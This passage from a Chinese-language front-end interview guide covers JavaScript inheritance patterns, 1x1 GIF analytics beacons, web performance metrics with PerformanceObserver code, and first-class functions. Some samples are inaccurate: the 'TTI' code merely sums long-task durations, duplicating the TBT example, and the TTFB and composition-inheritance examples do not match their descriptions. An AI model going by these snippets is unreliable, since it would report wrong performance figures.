child.sayHello() // Output: Hello, I am Child
```

- **拷贝继承**：特点：支持多继承，缺点：效率较低，内存占用高（因为要拷贝父类的属性）无法获取父类不可枚举的方法（不可枚举方法，不能使用`for in`访问到）

```javascript
function copyProperties(target, source) {
  for (var key in source) {
    if (source.hasOwnProperty(key)) {
      target[key] = source[key]
    }
  }
}

function Parent() {
  this.name = 'Parent'
}

Parent.prototype.sayHello = function () {
  console.log('Hello, I am ' + this.name)
}

function Child() {
  Parent.call(this)
  this.name = 'Child'
}

copyProperties(Child.prototype, Parent.prototype)

var child = new Child()
child.sayHello() // Output: Hello, I am Child
```

- **组合继承**：通过调用父类构造，继承父类的属性并保留传参的优点，然后通过将父类实例作为子类原型，实现函数复用

```javascript
function Parent(name) {
  this.name = name
}

Parent.prototype.sayHello = function () {
  console.log('Hello, I am ' + this.name)
}

function Child(name) {
  Parent.call(this, name)
}

Child.prototype = Object.create(Parent.prototype)
Child.prototype.constructor = Child

var child = new Child('Child')
child.sayHello() // Output: Hello, I am Child
```

- **寄生组合继承**：通过寄生方式，砍掉父类的实例属性，这样，在调用两次父类的构造的时候，就不会初始化两次实例方法/属性，避免的组合继承的缺点

```javascript
function Parent(name) {
  this.name = name
}

Parent.prototype.sayHello = function () {
  console.log('Hello, I am ' + this.name)
}

function Child(name) {
  Parent.call(this, name)
}

function inheritPrototype(child, parent) {
  var prototype = Object.create(parent.prototype)
  prototype.constructor = child
  child.prototype = prototype
}

inheritPrototype(Child, Parent)

var child = new Child('Child')
child.sayHello() // Output: Hello, I am Child
```

## 41. 为什么通常在发送数据埋点请求的时候使用的是 1x1 像素的透明 gif 图片？

1. **完成整个HTTP请求+响应**：使用`GIF`图片可以触发完整的`HTTP`请求+响应流程，尽管在埋点请求中不需要获取和处理响应内容。这样可以确保埋点请求按照正常的`HTTP`流程发送，并且服务器也能正常地接收和处理请求
2. **无需获取和处理数据**：`GIF`图片作为埋点请求，不需要获取和处理返回的数据。它只是简单地发送一个`GET`请求，不需要等待响应或处理响应内容，因此能够快速地完成请求并继续执行后续的代码
3. **跨域友好**：由于`GIF`图片是通过`<img>`标签加载的，而`<img>`标签在浏览器中天然支持跨域请求，因此使用`1x1`像素的透明`GIF`图片发送埋点请求可以轻松地实现跨域请求，无需关注跨域限制和复杂的配置
4. **无阻塞执行**：埋点请求通常是为了收集用户行为或统计数据，对于页面的性能和用户体验来说，不应该影响页面的加载和执行速度。由于`GIF`图片请求是异步的且无阻塞的，页面可以继续加载和执行其他代码，不会因为发送埋点请求而产生阻塞
5. **性能优化**：相比使用`XMLHttpRequest`对象发送`GET`请求，使用`1x1`像素的透明`GIF`图片能够在性能上更加高效。`GIF`图片的体积最小，仅需要`43`个字节（最小的`BMP`文件需要`74`个字节，`PNG`需要`67`个字节，而合法的`GIF`，只需要`43`个字节），而且在网络传输中通常会进行`gzip`压缩，进一步减小传输的数据量，这对于大规模的数据埋点和统计是非常有利的

综上所述，使用`1x1`像素的透明`GIF`图片作为数据埋点请求具有简单、快速、跨域友好、无阻塞等优势，使得它成为常用的数据埋点方式之一

## 42. 前端性能定位、优化指标以及计算方法

> 前端性能优化 已经是老生常谈的一项技术了 很多人说起性能优化方案的时候头头是道 但是真正的对于性能分析定位和性能指标这块却一知半解 所以这道题虽然和性能相关 但是考察点在于平常项目如何进行性能定位和分析
>
> - 我们可以从 前端性能监控-埋点以及 `window.performance`相关的 `api` 去回答
> - 也可以从性能分析工具 `Performance` 和 `Lighthouse`
> - 还可以从性能指标 `LCP` `FCP` `FID` `CLS` 等去着手

下面是关于前端性能定位、优化指标以及计算方法的一些信息：

1. 前端性能监控和埋点：通过在关键点上埋点，可以监控网页的加载时间、资源请求、错误等关键性能指标。常用的前端性能监控工具包括自定义的日志记录、第三方服务（如Google Analytics、Sentry等）和开源工具（如Fundebug、Tongji.js等）。此外，`window.performance` API提供了性能数据，可以通过它获取更详细的性能指标，如页面加载时间、资源加载时间等。
2. 性能分析工具：使用性能分析工具可以深入分析网站的性能瓶颈，并提供有针对性的优化建议。其中两个常用的工具是：
   - Performance：现代浏览器提供的内置性能分析工具，可通过浏览器开发者工具访问。它提供了时间轴记录、CPU、内存和网络分析等功能，帮助开发者找到性能瓶颈并进行优化。
   - Lighthouse：由Google开发的开源工具，可用于自动化测试网页性能，并提供综合的性能报告。它评估网页在多个方面的性能表现，并给出相应的优化建议。
3. 性能指标：性能指标是用于衡量网站性能的关键指标，常用的指标包括：

- **LCP**（Largest Contentful Paint）：标识页面上最大的可见内容加载完成的时间，衡量用户可见内容的加载速度。
- **FCP**（First Contentful Paint）：表示页面上第一个内容元素（如文字、图片）呈现的时间，标识页面加载的起点。
- **FID**（First Input Delay）：测量从用户首次与页面交互（点击链接、按钮等）到浏览器实际响应该交互的时间。
- **CLS**（Cumulative Layout Shift）：测量页面上元素布局的稳定性，即元素在页面加载过程中发生的意外移动的累积量。
- **TTFB**（Time To First Byte）：表示从发起请求到接收到第一个字节的时间，衡量服务器响应速度。
- **TTI**（Time To Interactive）：表示页面变得可交互的时间，即用户可以进行操作和与页面进行交互的时间点。
- **TBT**（Total Blocking Time）：衡量页面在加载过程中存在的阻塞时间总和，即浏览器忙于处理 JavaScript 执行而导致无法响应用户输入的时间。

这些指标可以通过性能分析工具或浏览器开发者工具来获得。优化这些指标有助于提升页面加载速度、响应性和用户体验。

以下是这些指标的计算方法和示例代码：

**1\. LCP（Largest Contentful Paint）：**

- 计算方法：监测到页面上的最大可见元素（如图片、视频等）加载完成的时间点。

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.entryType === 'largest-contentful-paint') {
      console.log('LCP:', entry.renderTime || entry.loadTime)
    }
  }
})
observer.observe({ type: 'largest-contentful-paint', buffered: true })
```

**2. FCP（First Contentful Paint）：**

- 计算方法：测量页面上第一个内容元素（如文字、图片）呈现的时间。

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (
      entry.entryType === 'paint' &&
      entry.name === 'first-contentful-paint'
    ) {
      console.log('FCP:', entry.startTime)
    }
  }
})
observer.observe({ type: 'paint', buffered: true })
```

**3. FID（First Input Delay）：**

- 计算方法：
  - 测量用户首次与页面交互（点击链接、按钮等）到浏览器实际响应该交互的时间。
  - 计算两个时间点之间的差值，即为 `FID`。

```javascript
document.addEventListener('DOMContentLoaded', () => {
  const observer = new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {
      if (entry.entryType === 'first-input' && entry.startTime < 5000) {
        console.log('FID:', entry.processingStart - entry.startTime)
      }
    }
  })
  observer.observe({ type: 'first-input', buffered: true })
})
```

**4. CLS（Cumulative Layout Shift）：**

- 计算方法：监测到页面上元素布局发生变化时，记录布局变化的量。将所有布局变化的量累积起来，即为 CLS。

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.entryType === 'layout-shift') {
      console.log('CLS:', entry.value)
    }
  }
})
observer.observe({ type: 'layout-shift', buffered: true })
```

**5. TTFB（Time To First Byte）：**

- 计算方法：
  - 记录发起请求的时间点。
  - 监测到接收到第一个字节的时间点。
  - 计算两个时间点之间的差值，即为 TTFB。

```javascript
const startTime = performance.now()
fetch('https://example.com').then((response) => {
  const endTime = performance.now()
  const duration = endTime - startTime
  console.log('TTFB:', duration)
  return response
})
```

**6. TTI（Time To Interactive）：**

- 计算方法：测量页面变得可交互的时间，即用户可以进行操作和与页面进行交互的时间点。
  - 监测到页面上的关键元素加载完成的时间点。
  - 监测到所有关键脚本的执行完成的时间点。
  - 监测到用户首次与页面交互的时间点。
  - 计算这些时间点之间的最大值，即为 TTI。

```javascript
function calculateTTI() {
  const longTasks = performance.getEntriesByType('longtask')
  const blockingTime = longTasks.reduce(
    (total, task) => total + task.duration,
    0,
  )
  console.log('TTI:', blockingTime)
}

window.addEventListener('load', () => {
  setTimeout(calculateTTI, 5000)
})
```

**7. TBT（Total Blocking Time）：**

- 计算方法：衡量页面在加载过程中存在的阻塞时间总和，即浏览器忙于处理 JavaScript 执行而导致无法响应用户输入的时间。
  - 监测到页面加载过程中 JavaScript 阻塞用户输入的时间段。
  - 将所有阻塞时间段的持续时间累积起来，即为 TBT。

```javascript
function calculateTBT() {
  const longTasks = performance.getEntriesByType('longtask')
  const blockingTime = longTasks.reduce(
    (total, task) => total + task.duration,
    0,
  )
  console.log('TBT:', blockingTime)
}

window.addEventListener('load', () => {
  setTimeout(calculateTBT, 5000)
})
```

上述示例代码可以在页面中嵌入并运行，通过浏览器的开发者工具或控制台查看相应的性能指标输出。注意，这些示例代码只是基本的计算方法，实际使用时可能需要根据具体的情况进行调整和扩展。此外，为了准确测量性能指标，建议在真实用户环境中进行测试和监测。

使用 `web-vitals` 库可以更方便地获取和处理性能指标。下面是使用 `web-vitals` 库的示例代码：

```javascript
import { getCLS, getFCP, getFID, getLCP, getTTFB } from 'web-vitals'

// CLS (Cumulative Layout Shift)
getCLS(console.log)

// FID (First Input Delay)
getFID(console.log)

// LCP (Largest Contentful Paint)
getLCP(console.log)

// FCP (First Contentful Paint)
getFCP(console.log)

// TTFB (Time To First Byte)
getTTFB(console.log)
```

## 43. 谈谈你对函数是一等公民的理解

JavaScript 中的函数被称为一等公民（First-class Citizens），这意味着函数在语言中被视为普通的值，可以像其他数据类型（例如数字、字符串、对象）一样被传递、赋值、存储和返回。

**以下是对 JavaScript 函数作为一等公民的几个重要特性和理解：**

1. 可以赋值给变量：函数可以像其他数据类型一样赋值给变量。你可以将函数定义存储在变量中，并在需要时将其作为值传递给其他函数或存储在数据结构中。
2. 可以作为参数传递：函数可以作为参数传递给其他函数。这使得函数能够接受其他函数作为输入，并根据需要执行或处理。
3. 可以作为返回值：函数可以作为另一个函数的返回值。你可以在一个函数内部定义并返回另一个函数，这使得函数能够灵活地生成和返回其他函数。
4. 可以存储在数据结构中：函数可以存储在数组、对象或其他数据结构中。这使得你可以在需要时使用函数，并根据需求对其进行组合、迭代或操作。
5. 可以通过字面量或表达式定义：函数可以通过函数字面量（函数表达式）或函数声明来定义。这为我们提供了灵活性，可以根据需要选择不同的方式来定义函数。
6. 可以通过闭包捕获状态：由于 JavaScript 中的函数形成了闭包，函数可以访问其所在作用域中的变量。这意味着函数可以捕获并保持对外部变量的引用，即使在函数外部不可访问的情况下也可以使用。

> 这些特性使得 JavaScript 中的函数非常强大和灵活。函数作为一等公民使得我们可以使用函数式编程的思想和技术，如高阶函数、函数组合、柯里化等，以更加优雅和灵活地编写代码。
